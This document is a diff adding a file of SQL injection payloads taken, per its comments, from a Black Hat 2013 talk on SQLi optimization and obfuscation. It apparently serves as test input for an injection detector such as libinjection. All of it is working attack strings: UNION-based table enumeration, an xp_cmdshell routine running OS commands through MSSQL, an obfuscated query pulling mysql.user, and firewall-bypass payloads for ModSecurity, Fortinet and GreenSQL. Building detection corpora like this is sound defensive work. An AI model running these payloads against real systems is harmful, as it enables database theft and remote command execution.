@@ -1,0 +1,151 @@
+#
+# from
+# Roberto Salgado
+# SQLi Optimization and Obfuscation Techniques
+# Black Hat USA 2013
+#
+
+#
+# Slide 47 - Optimizing Queries MSSQL
+# (note: slightly reworked to put in SQLi format)
+#
+1 UNION SELECT table_name + ', ' FROM information_schema.tables FOR XML PATH('')
+
+#
+# Slide 48 - Optimizing Queries Oracle
+# (note: slightly reworked to put in SQLi format)
+#
+1 UNION SELECT RTRIM(XMLAGG(XMLELEMENT(e, table_name || ',')).EXTRACT('//text()').EXTRACT('//text()') ,',') FROM all_tables
+
+#
+# Slide 49 - Optimizing Queries PSQL
+# (note: slightly reworked to put in SQLi format)
+#
+1 UNION SELECT array_to_json(array_agg(tables))::text FROM (SELECT schemaname, relname FROM pg_stat_user_tables) AS tables LIMIT 1
+
+#
+# Slide 50 - Optimizing Queries MSSQL
+#
+IF EXISTS (SELECT 1 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME='TMP_DB') DROP TABLE TMP_DB DECLARE @a varchar(8000) IF EXISTS(SELECT * FROM dbo.sysobjects WHERE id = object_id (N'[dbo].[xp_cmdshell]') AND OBJECTPROPERTY (id, N'IsExtendedProc') = 1) BEGIN CREATE TABLE %23xp_cmdshell (name nvarchar(11), min int, max int, config_value int, run_value int) INSERT %23xp_cmdshell EXEC master..sp_configure 'xp_cmdshell' IF EXISTS (SELECT * FROM %23xp_cmdshell WHERE config_value=1)BEGIN CREATE TABLE %23Data (dir varchar(8000)) INSERT %23Data EXEC master..xp_cmdshell 'dir' SELECT @a='' SELECT @a=Replace(@a%2B'<br></font><font color="black">'%2Bdir,'<dir>','</font><font color="orange">') FROM %23Data WHERE dir>@a DROP TABLE %23Data END ELSE SELECT @a='xp_cmdshell not enabled' DROP TABLE %23xp_cmdshell END ELSE SELECT @a='xp_cmdshell not found' SELECT @a AS tbl INTO TMP_DB--
+
+#
+# Slide 54 - Optimizing Queries - More Single Liners
+# (
+1 OR 1#"OR"'OR''='"="'OR''='
+
+#
+# Slide 55
+#
+1 OR 1#"OR"'OR''='"="'OR''='
+
+#
+# Slide 61
+#
+1!=0--+"!="'!='
+
+#
+# Slide 64 How to confuse an Admin
+#
+1 UNION select@0o0oOOO0Oo0OOooOooOoO00Oooo0o0oOO $ fRom(SeLEct@0o0oOOO0Oo0OOooOooOoO00Oooo0o0oOO frOM`information_schema`.`triggers`)0o0oOOO0Oo0OOooOooOoO00Oooo0o0oOO WHere !FAlSE||tRue&&FalSe||FalsE&&TrUE like TruE||FalSE union/*!98765select@000OO0O0OooOoO0OOoooOOoOooo0o0o:=grOup_cONcaT(`username`)``from(users)whErE(username)like'admin'limit 1*/select@000OO0O0OooOoO0OOoooO0oOooo0o0o limit 1,0 UnION SeleCt(selEct(sELecT/*!67890sELect@000OO0O0O0oOoO0OOoooOOoOooo0o0o:=group_concat(`table_name`)FrOM information_schema.statistics WhERE TABLe_SCHEmA In(database())*//*!@000OO0O0OooOoO0OOoooO0oOooo0o0o:=gROup_conCat(/*!taBLe_naME)*/fRoM information_schema.partitions where TABLe_SCHEma not in(concat((select insert(insert((select (collation_name)from(information_schema.collations)where(id)=true+true),true,floor(pi()),trim(version()from(@@version))),floor(pi()),ceil(pi()*pi()),space(0))), conv((125364/(true-!true))-42351, ceil(pi()*pi()),floor(pow(pi(),pi()))),mid(aes_decrypt(aes_encrypt(0x6175746F6D6174696F6E,0x4C696768744F53),0x4C696768744F53)FROM floor(version()) FOR ceil(version())),rpad(reverse(lpad(collation(user()),ceil(pi())--@@log_bin,0x00)),! !true,0x00),CHAR((ceil(pi())+!false)*ceil((pi()+ceil(pi()))*pi()),(ceil(pi()*pi())*ceil(pi()*pi()))--cos(pi()),(ceil(pi()*pi())*ceil(pi()*pi()))--ceil(pi()),(ceil(pi()*pi())*ceil(pi()*pi()))-cos(pi()),(ceil(pi()*pi())*ceil(pi()*pi()))--floor(pi()*pi()),(ceil(pi()*pi())*ceil(pi()*pi()))-floor(pi()))),0x6d7973716c))from(select--(select~0x7))0o0oOOO0Oo0OOooOooOoO00Oooo0o0oO)from(select@/*!/*!$*/from(select+3.``)000oOOO0Oo0OOooOooOoO00Oooo0o0oO)0o0oOOO0Oo0OOooOooOoO00Oooo0o0oO/*!76799sElect@000OO0O0OooOoO00Oooo0OoOooo0o0o:=group_concat(`user`)``from`mysql.user`WHeRe(user)=0x726f6f74*/#(SeLECT@ uNioN sElEcT AlL group_concat(cOLumN_nAME,1,1)FroM InFoRMaTioN_ScHemA.COLUMNS where taBle_scHema not in(0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c)UNION SELECT@0o0oOOO0Oo0OOooOooOoO00Oooo0o0oOO UNION SELECT@0o0oOOO0Oo0OOooOooOoO00Oooo0o0oOO UNION SELECT@000OO0O0OooOoO0OOoooO0oOooo0o0oOO UNION SELECT@0o0oOOO0Oo0OOooOooOoO00Oooo0o0oOO)
+
+
+#
+# Slide 74 (MySQL Obfuscation)
+#
+1.UNION SELECT 2
+3.2UNION SELECT 2
+1e0UNION SELECT 2
+SELECT\N/0.e3UNION SELECT 2
+1e1AND-0.0UNION SELECT 2
+1/*!12345UNION/*!31337SELECT/*!table_name*/
+{ts 1}UNION SELECT.`` 1.e.table_name
+SELECT $.`` 1.e.table_name
+SELECT{_ .``1.e.table_name}
+SELECT LightOS . ``1.e.table_name LightOS)
+SELECT information_schema 1337.e.tables 13.37e.table_name
+SELECT 1 from information_schema 9.e.table_name
+
+#
+# Slide 75 (MSSQL Obfuscation)
+#
+.1UNION SELECT 2
+1.UNION SELECT.2alias
+1e0UNION SELECT 2
+1e1AND-1=0.0UNION SELECT 2
+SELECT 0xUNION SELECT 2
+SELECT\UNION SELECT 2
+\1UNION SELECT 2
+SELECT 1FROM[table]WHERE\1=\1AND\1=\1
+SELECT"table_name"FROM[information_schema].[tables]
+
+#
+# Slide 76 (Oracle Obfuscation)
+#
+1FUNION SELECT 2
+1DUNION SELECT 2
+SELECT 0x7461626c655f6e616d65 FROM all_tab_tables
+SELECT CHR(116) || CHR(97) || CHR(98) FROM all_tab_tables
+SELECT%00table_name%00FROM%00all_tab_tables
+
+#
+# Slide 77 (Bypassing Firewalls, General Tips)
+#
+1 UNION SELECT GROUP_CONCAT(TABLE_NAME) FROM INFORMATION_SCHEMA.TABLES
+CASE WHEN BINARY TRUE THEN TRUE END IS NOT UNKNOWN HAVING TRUE FOR UPDATE
+
+#
+# Slide 78 (Modsecurity)
+#
+-2 div 1 union all #in%0a#between comments%0a#in%0a#between comments%0aselect 0x00, 0x41 like/*!31337table_name*/,3 from information_schema.tables limit 1
+
+#
+# Slide 79 (Modsecurity)
+#
+CASE WHEN BINARY TRUE THEN TRUE END IS UNKNOWN FOR UPDATE UNION SELECT MATTRESSES
+
+#
+# Slide 80 (Fortinet)
+# (Skipped since specific to Fortinet)
+#S%A0E%B1L%C2E%D3C%E4T%F6 1 U%FFNION SEL%FFECT 2
+
+#
+# Slide 81 (GreenSQL)
+#
+-1 UNION SELECT table_name FROM information_schema.tables limit 1
+1 AND 1=0 UNION SELECT table_name FROM information_schema.tables limit 1
+1 AND 1=0.e1 UNION SELECT table_name FROM information_schema.tables limit 1
+1 AND 1= binary 1 UNION SELECT table_name FROM information_schema.tables limit 1
+IF((SELECT mid(table_name,1,1) FROM information_schema.tables limit 1) =‘C’,1,2)
+
+#
+# Slide 83 (libinjection)
+#
+-1 UNION SELECT table_name Websec FROM information_schema.tables LIMIT 1
+-1 UNION%0ASELECT table_name FROM information_schema.tables LIMIT 1
+
+# note changed "FROM table" to "FROM table_name"
+# and "column" to "column_name"
+-1fUNION SELECT column_name FROM table_name
+
+1; DECLARE @test AS varchar(20); EXEC master.dbo.xp_cmdshell 'cmd'
+-[id] UNION SELECT table_name FROM information_schema.tables LIMIT 1
+{d 2} UNION SELECT table_name FROM information_schema.tables LIMIT 1
+
+#
+# Slide 84 (libinjection)
+#
+1 between 1 AND`id` having 0 union select table_name from information_schema.tables
+1 mod /*!1*/ union select table_name from information_schema.tables--
+true is not unknown for update union select table_name from information_schema.tables
+test'-1/1/**/union(select table_name from information_schema.tables limit 1,1)
+-1 union select @``"", table_name from information_schema.tables
+-1 LOCK IN SHARE MODE UNION SELECT table_name from information_schema.tables
+$.``.id and 0 union select table_name from information_schema.tables
+-(select @) is unknown having 1 UNION select table_name from information_schema.tables
+/*!911111*//*!0*/union select table_name x from information_schema.tables limit 1
+-1.for update union select table_name from information_schema.tables limit 1
+-0b01 union select table_name from information_schema.tables limit 1
+1<binary 1>2 union select table_name from information_schema.tables limit 1
+-1 procedure analyse(1gfsdgfds, sfg) union select table_name from information_schema.tables limit 1
+
+
